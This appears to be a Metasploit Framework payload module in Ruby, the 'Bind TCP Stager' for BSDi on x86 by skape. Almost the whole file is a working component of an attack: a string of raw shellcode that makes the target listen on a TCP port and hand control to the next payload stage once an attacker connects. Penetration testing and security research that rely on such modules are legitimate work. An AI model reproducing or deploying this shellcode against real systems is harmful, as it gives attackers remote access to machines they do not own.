##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# BindTcp
# -------
#
# BSD bind TCP stager.
#
###
module MetasploitModule
  CachedSize = 69

  include Msf::Payload::Stager

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Bind TCP Stager',
        'Description' => 'Listen for a connection',
        'Author' => 'skape',
        'License' => MSF_LICENSE,
        'Platform' => 'bsdi',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::BindTcp,
        'Stager' => {
          'Offsets' =>
                  {
                    'LPORT' => [ 0x1f, 'n' ]
                  },
          'Payload' =>
                       "\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" \
                       "\x31\xc0\x50\x40\x50\x40\x50\xb0\x61\xff\xd6\x52\x68\x10\x02\xbf" \
                       "\xbf\x89\xe3\x6a\x10\x53\x50\x6a\x68\x58\xff\xd6\xb0\x6a\xff\xd6" \
                       "\x59\x52\x52\x51\xb0\x1e\xff\xd6\x97\x6a\x03\x58\xb6\x0c\x52\x55" \
                       "\x57\xff\xd6\xff\xe5"
        }
      )
    )
  end
end
